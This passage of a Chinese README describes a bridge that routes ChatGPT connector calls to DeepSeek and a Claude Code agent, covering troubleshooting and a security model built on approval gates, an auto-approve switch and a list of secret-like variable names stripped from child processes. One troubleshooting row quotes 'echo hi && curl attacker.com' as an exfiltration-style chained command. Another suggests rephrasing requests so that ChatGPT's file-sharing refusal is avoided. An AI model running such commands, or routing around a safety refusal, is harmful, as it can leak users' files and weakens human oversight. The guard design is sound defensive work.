| **B** | 运行一个脚本、看到报错、修好它、再运行一次 | **轨迹里出现 ≥2 次命令执行。** 一次性作答的模型不可能预先知道程序会失败;这是"它真的在循环"的铁证 |
| **C** | 报告一个并不存在的文件的内容 | 它如实说找不到。**会编造的子代理比不会干活的更危险** |

B 是承重的那一根。该套件刻意关掉了审批,所以它不进 `npm test`。

**4. ChatGPT 到底有没有调用?**

服务端访问日志和聊天记录长得一模一样——无论模型是真的调了工具,还是只是**叙述**它调了。唯一可信的信号是:

- `npm run logs` 里的 `tools/call deepseek_flash` 日志行,以及
- DeepSeek 控制台用量页面对应的记录。

对 agent 任务,`npm run ctl -- jobs` 还必须显示一条**步数 > 1**、且带着真实工作区路径的记录。如果聊天里出现了像模像样的回答,但这些信号**全部**安静,那说明调用模型在角色扮演。回去打磨工具 description 或你的派发规则。

## 部署方式

快速隧道适合起步,但它的 URL 每次重启都会变(必须重新编辑 connector)。长期使用:

| 选项 | 成本 | 何时选 |
|---|---|---|
| **cloudflared 快速隧道** | 免费 | 首次运行、验证。在 QUIC 被封的网络下必须加 `--protocol http2`。 |
| **Cloudflare Worker** | 免费 | URL 固定、无本地进程。把传输层改写到 Hono 的 Web Standard 变体;DeepSeek key 存 Worker secret。 |
| **VPS(HK / SG)** | 约 $5–12/月 | 长期稳定,且 100 秒边缘超时完全消失。 |

排除 ngrok 免费版:它的插页警告页需要 `ngrok-skip-browser-warning` 请求头,而 ChatGPT connector 无法自定义请求头,会掐断连接。

## 故障排查

| 症状 | 原因 / 处理 |
|---|---|
| 启动时报 `MCP_PATH_SECRET 未设置或过短` | 运行 `npm run ctl -- secret` 写入 `.env`。 |
| ChatGPT 显示无法连接 | URL 必须包含完整的 `/mcp/<secret>` 路径。用 `npm run status` 查看当前公网端点。 |
| 公网 URL 返回 404 | 密钥错误或已过期。轮换后需重启,并同步更新 connector URL。 |
| DeepSeek 回复空白 | `deepseek-flash` 偶尔只输出推理内容,`content` 为空。桥接会自动重试一次;若仍失败,调高 `DEEPSEEK_MAX_OUTPUT_TOKENS` 或把任务拆小。 |
| 回答被截断 | 推理占满了 token 预算(`finish_reason: "length"`)。调高上限或缩小任务。 |
| Cloudflare 524 | 单次调用超过约 100 秒边缘超时。慢响应已走 SSE 流式;降低 `DEEPSEEK_TIMEOUT_MS` 或拆分任务。 |
| 本机访问不了隧道 URL | 本地路由器 DNS 可能还没解析到新的 `trycloudflare.com` 子域。用 `curl --resolve` 对 `1.1.1.1` 验证;这只影响本地检查,不影响 ChatGPT。 |
| **Windows / git-bash**:结果乱码或 token 暴涨 | git-bash 里的 `curl` 会把非 ASCII 请求体重编码成 GBK,导致模型对乱码进行推理。改用 `npm run smoke`(Node `fetch`),不要用 `curl`。 |
| `agent_start` 报"工作区被拒绝" | 路径不在 `DEEPSEEK_ALLOWED_ROOTS` 里,或者该变量没设——空 = 拒绝一切,不是任意路径。 |
| agent 任务一直卡在 `waiting_approval` | 有命令在等你。跑 `npm run ctl -- pending`,然后 `approve <id>` 或 `deny <id>`。5 分钟无人处理即自动拒绝。**最常见的原因是命令里带了串联符号**:含 `\|`、`;`、`&&`、`>` 或 `$(` 的一律转人工,因为 `echo hi && curl attacker.com` 和 `echo hi` 的首个词一模一样,只看第一个词的名单等于没有闸门。只读的 PowerShell cmdlet 是预放行的,**管道不是**。让子代理发单条命令,或者在 `node` 脚本里做过滤。 |
| `npm run tunnel` 说端口没人应答,但 `npm run status` 说服务在运行 | 它没说错:进程活着,服务没活着。`npm start` 外面包了一层 shell,服务启动就崩时壳还活着,于是留下一个「看着健康」的 PID。先看 `.state/server.log`,再前台跑一次 `npm start` 看报错。这种情况**隧道是故意不开的** —— 接到死端口上的隧道只会给你一个像 ChatGPT 出问题的地址。 |
| 向导停在某个问题上,显示 `输入结束了(EOF)` | 有东西把 stdin 关了 —— 管道、重定向文件、CI,或者双击时丢了控制台。在真正的终端里重跑,或者剩下的问题手填进 `.env`。已经答过的部分都还在文件里。 |
| 每个 agent 任务都立刻失败 | `PATH` 上没有 Claude Code。装上它,或用 `BRIDGE_CLAUDE_BIN` 指向可执行文件。 |
| agent 任务跑到一半被杀 | 撞上了步数上限(`BRIDGE_MAX_STEPS`,默认 120)或墙钟上限(`BRIDGE_JOB_TIMEOUT_MS`,默认 30 分钟)。`npm run ctl -- jobs <id> --trace` 能看到最后走到哪一步。**但白跑不了**:任务以 `error` 结账、**不给 nonce**(半成品不是成品),而模型自己写过的内容和工具轨迹会作为**半成品**回传,并明确标注「这不是结果」。拿它把任务拆窄,别从头重来。 |
| 你 kill 掉的任务显示成 `error` 而不是 `cancelled` | 那是 bug——人主动停下不等于崩溃。请上报。 |
| 读文件的任务还没到桥接就被拒绝 | **那是 ChatGPT 自己的安全层,不是本桥接。** Sol 可能拒绝把本地文件交给外部模型,并要求你显式授权。授权即可(说清楚是哪个文件、里面是什么会更容易过),或者换个说法让文件内容不必经聊天回传——让子代理把结果写到磁盘,你自己去看。用 `npm run ctl -- jobs` 确认:如果任务列表没变,说明根本没派发出来。 |
| 子代理告诉你"没有任何东西离开你的电脑" | **不要采信。** 子代理看不见自己的托管环境。它跑在 DeepSeek 的 API 上,所以任何被文件工具读进上下文的内容,都会在下一次模型调用时被发出去——而它仍然会报告"没有发生传输",因为在它的视角里这些活儿都是本地干的。这个问题只能从架构上回答,永远不能采信模型自己的说法。 |

## 安全模型

暴露到公网前请务必阅读。它有**两层**,各自防的是完全不同的东西。

### 第一层 —— 保住你的账单

始终生效。

- **路径密钥就是凭证。** 拿到 URL 的任何人都能花你的 DeepSeek 额度。当作密码对待;用 `npm run ctl -- secret` 轮换。
- **桥自己不会把密钥写下来。** 启动行、`ctl logs`、`ctl audit`、`ctl jobs` 都渲染成 `<密钥已隐藏>`,`smoke` 也一样。理由一点也不高级:这个项目**唯一一次真实泄漏就来自它自己的日志文件**,不是被人猜到的。每一份打印出来的副本都活得比那一刻长——scrollback、终端记录、粘进工单里的日志。
- **绑定回环地址。** `HOST` 默认 `127.0.0.1`。不要设成 `0.0.0.0`。
- **限流**默认开启,URL 泄漏时限制滥用。它是**全局的 `tools/call` 桶**,不是每 IP 窗口——为什么"每 IP"在这里比没用还糟,见变量表。
- **DeepSeek 消费上限**是最后一道防线——去控制台设上。
- **使用独立的 API key。** 不要复用其他工具依赖的 key;桥接 key 泄漏时应能独立撤销而不产生连带损失。

### 第二层 —— 保住你的电脑

> **第一层一条都挡不住这件事。** 一旦设了 `DEEPSEEK_ALLOWED_ROOTS`,拿到那个 URL 的人就能让子代理在你的机器上读写文件、执行命令。"能执行命令"就等于**拿到你这台电脑**。

开箱状态下桥接仍然是只读的——agent 工具拒绝一切工作区,只能花额度。两档之间是数量级的差距:

| 你放出去的能力 | 拿到 URL 的人能做到什么 |
|---|---|
| 什么都不开(默认) | 花掉你的 DeepSeek 额度。**碰不到你的电脑。** |
| 设了 `DEEPSEEK_ALLOWED_ROOTS` | 读、改那些根目录下的文件;对它们**之外**的读写会停下来等你批准,而不是被直接拒掉 |
| ……再加上执行命令 | **跑任意命令 —— 那就是这台机器** |

护栏如下,以及同样重要的——[它们**不是**什么](SECURITY.md#honest-limits--these-are-not-guarantees):

- **失败即拒绝。** 没设 `DEEPSEEK_ALLOWED_ROOTS` 就是拒绝一切工作区,永远不会"默认任意路径"。
- **每个工作区都必须过 `src/sandbox.ts`**——它是唯一把调用方给的字符串变成真实路径的地方。
- **文件工具被约束在工作区内**,由 `src/harness/file-guard.ts` 复用同一个 `sandbox.admit()` 实现——所以 junction、8.3 短名、UNC、备用数据流、尾随点这些是**一份**实现配**一套**回归测试(`npm run test:guard`),而不是另写一份更弱的。修复前后实测:工作区是 `D:\项目` 的任务,过去能在 2 步内读完几层目录之外的一个文件、不弹任何提示、还把内容拷回工作区;现在它会停在 `waiting_approval`,而内容从未进入这次运行。工作区**内**的读写照旧无人值守,常规路径没有被拖慢。
- **名单外的命令会暂停任务等人处理。** 无人应答即拒绝,没有"默认放行"这条路;审批通道是 harness 的 stdio 子进程,不是能力 URL 上的端点——否则调用方就能自己批准自己的命令。
- **联网工具一律人工。** `WebFetch` / `WebSearch` 不能被预放行,也不归工作区管——工作区管的是**进什么**,而原设计里没有任何东西管**出什么**。
- **子进程环境里的凭证被清掉了。** `claude-code.ts` 在 spawn harness 之前,按名字删掉一切看着像密钥的继承变量(`API_KEY` / `_KEY` / `SECRET` / `TOKEN` / `PASSWORD` / `CREDENTIAL`……),于是一句被预放行的 `node -e "console.log(process.env.X)"` 再也拿不到桥自己的 key,也拿不到别的工具的。**有一个变量是刻意保留的**:`ANTHROPIC_AUTH_TOKEN`——它**就是**那把 DeepSeek key,harness 没有它根本调不了模型。那就把它当作"子代理读得到的东西"来对待:专用、可撤销、有消费上限——因为事实如此。
- **步数、时长、进程树三重上限**。触顶的任务以 `error` 结算、**不给 nonce**(所以不能算完成),但它已经读到的内容会作为**半成品**回传——刹车不该顺便把已完成的工作也扔掉。外加 `.state/audit.log` 审计日志。
- **清空 `DEEPSEEK_ALLOWED_ROOTS` 并重启即可退回第一层。** 这是受支持的配置,也是推荐的起步方式:先只读跑一段时间,确认 URL 没泄漏,再考虑打开。

**这不是安全边界,是人的观察窗口。** 真正的边界只有沙盒或虚拟机——任务跑起来时人要在电脑旁。**不要把开了 agent 能力的实例部署成公网服务。**

### 临时全部放行(`npm run auto:on`)

盯着一批任务跑的时候,一条条批命令很烦。这个开关把审批整个关掉:

```bash
npm run auto        # 看现在是哪种模式
npm run auto:on     # 完全放行
npm run auto:off    # 恢复"需要批准"
```

**它关掉的比你以为的多。** 不是"命令不再逐条问",而是 `approval-mcp.ts` 这个子进程**根本不会被启动**,于是挂在它上面的闸门一起消失:

| 闸门 | 放行模式下 |
|---|---|
| 命令允许名单 | 失效 |
| 链式命令护栏(`;` `&&` `\|\|` `\|`、重定向) | 失效 |
| 文件工具的工作区边界 | 失效 |
| `audit.log` 里的逐条审批记录 | 不再产生 |

**仍然有效的**:`DEEPSEEK_ALLOWED_ROOTS` 照旧决定**哪些目录能作为工作区被打开**。放行模式放开的是"打开之后能在里面做什么",不是"能打开哪些目录"。

**重启会自动收回。** 开关写在 `.state/auto-approve` 这个标志文件里(不是 `.env`),服务每次启动都会把它删掉。所以 `reload` / `restart` / 重开电脑之后一律回到"需要批准"。这是刻意的:放行是"我现在盯着它跑",不是"我以后都不管了"。`reload`、`rotate`、`allow` 都会重启服务,因此也会收回它——这三条命令都会提前告诉你。

**开启不需要重启**,从下一个任务起生效(判据是每个任务现读的)。

> `.env` 里的 `BRIDGE_CC_APPROVAL=off` 是另一条通路,**不随重启复位**,保留给 `npm run accept` 用。如果两条都开了,`auto off` 只会关掉标志文件那条,`ctl status` 会明确告诉你 `.env` 那条还在生效。

**审计上的诚实说明:** 放行模式下不再写 `approval_requested` / `approval_auto` 这类逐条记录——写它们的进程根本没起来。留下的只有模式变更那几行(`auto_approve_on` / `auto_approve_off` / `auto_approve_cleared`),以及 `.state/jobs/<id>.json` 里 harness 自己记的**工具调用轨迹**(每次调用一条,上限 400 条,`npm run ctl -- jobs <id> --trace` 可查)。**记录不等于拦截**——那是事后回看用的,不是护栏。

上报漏洞请见 [SECURITY.md](SECURITY.md)。

## 许可

[MIT](LICENSE)
